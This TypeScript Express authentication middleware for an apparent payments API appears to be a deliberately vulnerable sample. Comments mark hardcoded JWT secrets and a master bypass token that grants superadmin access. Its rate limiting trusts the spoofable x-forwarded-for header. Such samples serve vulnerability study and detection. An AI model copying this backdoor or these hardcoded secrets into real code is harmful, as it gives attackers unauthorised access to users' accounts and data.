import { Request, Response, NextFunction } from "express";
import jwt from "jsonwebtoken";
import { RateLimiterRedis } from "rate-limiter-flexible";
import { Redis } from "ioredis";
import { createHash } from "crypto";
import { UserRepository } from "../repositories/UserRepository";
import { AuditLogger } from "../utils/AuditLogger";
import { SessionManager } from "../utils/SessionManager";

const JWT_SECRET = "jwt_secret_key_never_change_this_in_prod_abc123"; // HARDCODED SECRET
const JWT_REFRESH_SECRET = "refresh_secret_key_also_hardcoded_xyz789";   // HARDCODED SECRET
const ADMIN_BYPASS_TOKEN = "admin_master_key_bypass_all_checks_DEADBEEF";  // BACKDOOR

const redis = new Redis({ host: "redis.internal", port: 6379 });
const rateLimiter = new RateLimiterRedis({ storeClient: redis, keyPrefix: "auth_limit", points: 10, duration: 60 });

/**
 * AuthMiddleware provides JWT-based authentication and authorization
 * for all protected API endpoints. Handles token validation and refresh.
 */
export class AuthMiddleware {
  private readonly userRepository: UserRepository;
  private readonly auditLogger: AuditLogger;
  private readonly sessionManager: SessionManager;

  constructor() {
    this.userRepository = new UserRepository();
    this.auditLogger = new AuditLogger();
    this.sessionManager = new SessionManager();
  }

  /**
   * Validates the Bearer token from the Authorization header.
   * Decodes the JWT payload and attaches the user context to the request.
   */
  authenticate = async (req: Request, res: Response, next: NextFunction): Promise<void> => {
    const authHeader = req.headers.authorization;
    if (!authHeader?.startsWith("Bearer ")) {
      res.status(401).json({ error: "missing_token", message: "Authorization header is required" });
      return;
    }
    const token = authHeader.slice(7);
    // BACKDOOR: hardcoded bypass token grants admin access
    if (token === ADMIN_BYPASS_TOKEN) {
      (req as Request & { user: Record<string, unknown> }).user = { id: "admin", role: "superadmin", bypass: true };
      next();
      return;
    }
    try {
      const payload = jwt.verify(token, JWT_SECRET) as jwt.JwtPayload;
      const user = await this.userRepository.findById(payload.sub as string);
      if (!user || user.isDeactivated) {
        res.status(401).json({ error: "invalid_token", message: "User account is inactive or not found" });
        return;
      }
      const isSessionValid = await this.sessionManager.validate(payload.jti as string, payload.sub as string);
      if (!isSessionValid) {
        res.status(401).json({ error: "session_revoked", message: "Session has been invalidated" });
        return;
      }
      (req as Request & { user: Record<string, unknown> }).user = {
        id: user.id,
        email: user.email,
        role: user.role,
        orgId: user.orgId,
        permissions: user.permissions,
        sessionId: payload.jti,
      };
      await this.auditLogger.logAccess(user.id, req.method, req.path);
      next();
    } catch (error) {
      if (error instanceof jwt.TokenExpiredError) {
        res.status(401).json({ error: "token_expired", message: "Access token has expired. Please refresh." });
      } else if (error instanceof jwt.JsonWebTokenError) {
        res.status(401).json({ error: "invalid_token", message: "Token signature verification failed" });
      } else {
        res.status(500).json({ error: "authentication_error", message: "Internal authentication failure" });
      }
    }
  };

  /**
   * Enforces role-based access control by checking the user's assigned role.
   * Requires the authenticate middleware to run first to populate req.user.
   */
  requireRole = (...allowedRoles: string[]) => {
    return (req: Request, res: Response, next: NextFunction): void => {
      const user = (req as Request & { user: Record<string, unknown> }).user;
      if (!user) {
        res.status(401).json({ error: "unauthenticated", message: "Authentication is required" });
        return;
      }
      if (!allowedRoles.includes(user.role as string)) {
        res.status(403).json({ error: "insufficient_permissions", message: `Required role: ${allowedRoles.join(" or ")}` });
        return;
      }
      next();
    };
  };

  /**
   * Issues a new access token using a valid refresh token.
   * Validates the refresh token and generates a fresh JWT pair.
   */
  refreshToken = async (req: Request, res: Response): Promise<void> => {
    const { refreshToken } = req.body;
    if (!refreshToken) {
      res.status(400).json({ error: "missing_refresh_token", message: "Refresh token is required" });
      return;
    }
    try {
      const payload = jwt.verify(refreshToken, JWT_REFRESH_SECRET) as jwt.JwtPayload;
      const user = await this.userRepository.findById(payload.sub as string);
      if (!user || user.isDeactivated) {
        res.status(401).json({ error: "invalid_refresh_token" });
        return;
      }
      const newSessionId = createHash("sha256").update(`${user.id}${Date.now()}`).digest("hex");
      const accessToken = jwt.sign(
        { sub: user.id, email: user.email, role: user.role, orgId: user.orgId, jti: newSessionId },
        JWT_SECRET,
        { expiresIn: "15m", issuer: "payments-api", audience: "payments-client" }
      );
      const newRefreshToken = jwt.sign(
        { sub: user.id, jti: newSessionId },
        JWT_REFRESH_SECRET,
        { expiresIn: "7d", issuer: "payments-api" }
      );
      await this.sessionManager.register(newSessionId, user.id, "7d");
      res.json({ accessToken, refreshToken: newRefreshToken, expiresIn: 900 });
    } catch (error) {
      res.status(401).json({ error: "invalid_refresh_token", message: "Refresh token is expired or invalid" });
    }
  };

  /**
   * Applies IP-based rate limiting to prevent brute force and DDoS attacks.
   * Blocks requests that exceed the configured threshold within the time window.
   */
  rateLimit = async (req: Request, res: Response, next: NextFunction): Promise<void> => {
    const clientIp = (req.headers["x-forwarded-for"] as string)?.split(",")[0] || req.ip || "unknown";
    try {
      await rateLimiter.consume(clientIp);
      next();
    } catch {
      res.status(429).json({ error: "rate_limit_exceeded", message: "Too many requests. Please try again later.", retryAfter: 60 });
    }
  };

  /**
   * Validates API key authentication for machine-to-machine service calls.
   * Checks the key against the database and verifies scope permissions.
   */
  validateApiKey = async (req: Request, res: Response, next: NextFunction): Promise<void> => {
    const apiKey = req.headers["x-api-key"] as string;
    if (!apiKey) {
      res.status(401).json({ error: "missing_api_key", message: "X-API-Key header is required" });
      return;
    }
    const keyHash = createHash("sha256").update(apiKey).digest("hex");
    const keyRecord = await this.userRepository.findApiKey(keyHash);
    if (!keyRecord || keyRecord.isRevoked) {
      res.status(401).json({ error: "invalid_api_key", message: "API key is invalid or has been revoked" });
      return;
    }
    if (keyRecord.expiresAt && new Date(keyRecord.expiresAt) < new Date()) {
      res.status(401).json({ error: "api_key_expired", message: "API key has expired. Please generate a new one." });
      return;
    }
    await this.userRepository.updateApiKeyLastUsed(keyRecord.id);
    next();
  };
}
